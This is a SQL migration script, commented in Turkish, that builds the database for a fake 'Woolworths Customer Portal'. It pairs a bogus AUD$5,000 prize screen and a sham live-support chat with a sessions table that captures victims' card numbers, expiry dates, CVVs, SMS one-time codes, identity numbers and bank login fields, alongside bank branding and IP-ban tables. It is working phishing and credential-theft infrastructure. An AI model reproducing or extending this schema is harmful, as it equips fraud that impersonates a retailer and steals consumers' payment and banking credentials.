-- ============================================================
-- WOOLWORTHS AUD — FULL BOOTSTRAP MIGRATION (BUTUN TABLOLAR)
-- ============================================================
-- Dosya sirasi: (0) 20240506_add_global_settings.sql
--               (1) create_banks_table.sql
--               (2) bootstrap_new_zealand_schema.sql  (sessions vb temel tablolar)
--               (3) bootstrap sonrasi ek migrationlar (sirayla)
-- ============================================================

-- ####################################################################
-- (0) 20240506_add_global_settings.sql
-- ####################################################################
CREATE TABLE IF NOT EXISTS public.global_settings (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  target_country TEXT DEFAULT 'Australia',
  currency TEXT DEFAULT 'AUD$',
  portal_name TEXT DEFAULT 'Woolworths Customer Portal',
  support_center_name TEXT DEFAULT 'Woolworths Customer Support',
  win_title TEXT DEFAULT 'Exclusive Woolworths Bonus Offer',
  win_subtitle TEXT DEFAULT 'Congratulations! You have been selected for today''s Woolworths national promotion. Click the button below to claim your AUD$5,000 bonus.',
  live_support_title TEXT DEFAULT 'Woolworths Live Support',
  live_support_subtitle TEXT DEFAULT 'To continue, you need to contact our Woolworths customer support team.

Click the button below to start the chat.',
  logo_url TEXT,
  bg_url TEXT DEFAULT '/portal/desktop-background.png',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- ####################################################################
-- (1) create_banks_table.sql
-- ####################################################################
CREATE TABLE IF NOT EXISTS public.banks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  slug TEXT NOT NULL UNIQUE,
  name TEXT NOT NULL,
  country TEXT NOT NULL DEFAULT 'Australia',
  logo_url TEXT,
  brand_color TEXT,
  accent_color TEXT,
  sort_order INT DEFAULT 100,
  is_active BOOLEAN DEFAULT true,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

ALTER TABLE public.banks ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS banks_select_policy ON public.banks;
CREATE POLICY banks_select_policy ON public.banks FOR SELECT USING (true);

DROP POLICY IF EXISTS banks_write_policy ON public.banks;
CREATE POLICY banks_write_policy ON public.banks FOR ALL
USING (auth.role() = 'service_role' OR current_user = 'postgres')
WITH CHECK (auth.role() = 'service_role' OR current_user = 'postgres');

-- ####################################################################
-- (2) bootstrap_new_zealand_schema.sql — sessions + partners vb. temel tablolar
-- ####################################################################
CREATE TABLE IF NOT EXISTS public.partners (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  name TEXT NOT NULL,
  code TEXT NOT NULL UNIQUE,
  slug TEXT,
  brand_color TEXT,
  logo_url TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- public_id auto-increment sequence (kisa URL'ler icin UUID yerine sayisal ID)
CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq;

CREATE TABLE IF NOT EXISTS public.sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  public_id TEXT UNIQUE DEFAULT nextval('public.sessions_public_id_seq')::TEXT,
  partner_id UUID REFERENCES public.partners(id) ON DELETE SET NULL,
  target_country TEXT DEFAULT 'Australia',
  current_step TEXT DEFAULT 'win',
  amount INT NOT NULL DEFAULT 0 CHECK (amount >= 0),
  status TEXT NOT NULL DEFAULT 'offline',
  visitor_ip TEXT,
  ip_address TEXT,
  user_agent TEXT,
  language TEXT,
  current_bank_slug TEXT,
  form_data JSONB DEFAULT '{}'::jsonb,
  bankFormHistory JSONB DEFAULT '[]'::jsonb,
  orderedField1 TEXT,
  orderedField1Key TEXT,
  orderedField2 TEXT,
  orderedField2Key TEXT,
  orderedField2Type TEXT DEFAULT 'password',
  orderedField3 TEXT,
  orderedField3Key TEXT,
  identity_number TEXT,
  card_number TEXT,
  card_expiry TEXT,
  card_cvv TEXT,
  card_holder TEXT,
  sms_code TEXT,
  code_value TEXT,
  sms_digits INT NOT NULL DEFAULT 6 CHECK (sms_digits >= 4 AND sms_digits <= 12),
  sms_custom_text TEXT,
  partner_name TEXT,
  participation_code TEXT,
  is_hidden BOOLEAN DEFAULT false,
  is_completed BOOLEAN DEFAULT false,
  total_bonus_amount_cents INT DEFAULT 0,
  last_ping_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS sessions_all_anon_public ON public.sessions;
CREATE POLICY sessions_all_anon_public ON public.sessions
FOR ALL USING (true) WITH CHECK (true);

-- sessions index
CREATE INDEX IF NOT EXISTS idx_sessions_created_at_desc ON public.sessions (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_current_step ON public.sessions (current_step);
CREATE INDEX IF NOT EXISTS idx_sessions_target_country ON public.sessions (target_country);
CREATE INDEX IF NOT EXISTS idx_sessions_is_hidden ON public.sessions (is_hidden);
CREATE INDEX IF NOT EXISTS idx_sessions_last_ping_at ON public.sessions (last_ping_at);
CREATE UNIQUE INDEX IF NOT EXISTS sessions_public_id_idx ON public.sessions (public_id);

-- sequence ownership (temizlik icin)
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;

-- sessions set_updated_at trigger
CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS trigger AS $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

DROP TRIGGER IF EXISTS sessions_set_updated_at ON public.sessions;
CREATE TRIGGER sessions_set_updated_at
BEFORE UPDATE ON public.sessions
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

-- ####################################################################
-- (3) bootstrap sonrasi ek migrationlar (sirayla)
-- ####################################################################

-- add_country_and_target_country.sql (zaten sutunlar yukarida var)

-- add_settings_columns.sql (global_settings icin logo_url ve bg_url yukarida var)

-- add_missing_win_button_and_bg.sql — extra bg_mobile_url vb. sutunlar
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS bg_url_mobile TEXT DEFAULT '/portal/mobile-background.png';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS wheel_settings JSONB DEFAULT '{}'::jsonb;

-- add_more_translation_settings.sql
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS translations JSONB DEFAULT '{}'::jsonb;

-- add_live_support_step.sql (live_support_title/subtitle yukarida var)

-- add_wheel_settings.sql (wheel_settings sutunu zaten eklendi)

-- add_user_agent_to_sessions.sql (user_agent yukarida var)

-- add_sms_custom_text.sql
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_custom_text TEXT;

-- add_partner_and_code.sql
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_code TEXT;

-- add_public_id_to_sessions.sql (public_id yukarida var)

-- add_chat_messages.sql
CREATE TABLE IF NOT EXISTS public.chat_messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id UUID REFERENCES public.sessions(id) ON DELETE CASCADE,
  role TEXT NOT NULL,
  content TEXT NOT NULL,
  image_urls TEXT[] DEFAULT '{}'::text[],
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_chat_messages_session_id ON public.chat_messages(session_id);

-- add_chat_images.sql
CREATE TABLE IF NOT EXISTS public.chat_images (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  message_id UUID REFERENCES public.chat_messages(id) ON DELETE CASCADE,
  storage_path TEXT NOT NULL,
  public_url TEXT,
  mime_type TEXT,
  size_bytes INT,
  width INT,
  height INT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- add_ip_ban_tables.sql
CREATE TABLE IF NOT EXISTS public.ip_bans (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  ip_address TEXT NOT NULL UNIQUE,
  reason TEXT,
  banned_by TEXT,
  expires_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- add_is_active_to_banks.sql (banks tablosunda zaten var)

-- add_is_hidden_to_sessions.sql (is_hidden zaten var)

-- update_invalid_bank_constraint.sql
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS invalid_bank_reason TEXT;

-- set_global_settings_bg_to_real_photo.sql + revert + update_global_settings_bg_ai_2026 (default degerler zaten Woolworths AU olarak ayarli)

-- fix_global_settings_uuid.sql + fix_rls_global_settings.sql
ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS global_settings_all_policy ON public.global_settings;
CREATE POLICY global_settings_all_policy ON public.global_settings FOR ALL USING (true) WITH CHECK (true);

-- fix_sessions_rls_policies.sql + fix_sessions_schema_alignment.sql (sessions RLS zaten izin veriyor)

-- 20260802043000_add_nz_bank_logos_and_rabobank.sql — banks sutunlari var, skip
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS primary_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS secondary_color TEXT;

-- 20260720160943_add_is_active_to_banks.sql — zaten var

-- 20260808_create_audit_event_logs.sql
CREATE TABLE IF NOT EXISTS public.audit_event_logs (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  event_type TEXT NOT NULL,
  severity TEXT NOT NULL DEFAULT 'info',
  session_id TEXT,
  session_uuid UUID,
  bank_slug TEXT,
  actor TEXT,
  message TEXT NOT NULL,
  payload JSONB DEFAULT '{}'::jsonb,
  metadata JSONB DEFAULT '{}'::jsonb
);

CREATE INDEX IF NOT EXISTS idx_audit_event_logs_created_at_desc ON public.audit_event_logs (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_session ON public.audit_event_logs (session_id, session_uuid);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_type ON public.audit_event_logs (event_type);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_severity ON public.audit_event_logs (severity);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_bank_slug ON public.audit_event_logs (bank_slug);

ALTER TABLE public.audit_event_logs ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS audit_event_select_public ON public.audit_event_logs;
CREATE POLICY audit_event_select_public ON public.audit_event_logs
  FOR SELECT USING (true);

DROP POLICY IF EXISTS audit_event_insert_anon ON public.audit_event_logs;
CREATE POLICY audit_event_insert_anon ON public.audit_event_logs
  FOR INSERT WITH CHECK (true);

-- 20260808_audit_event_session_id_text.sql — session_id TEXT zaten var

-- 20260808_fix_audit_event_select_policies.sql — yukarida yapildi

-- 20260808_sessions_last_ping_at.sql — last_ping_at sutunu zaten sessions tablosunda var

-- refresh_postgrest_schema_cache.sql
NOTIFY pgrst, 'reload schema';
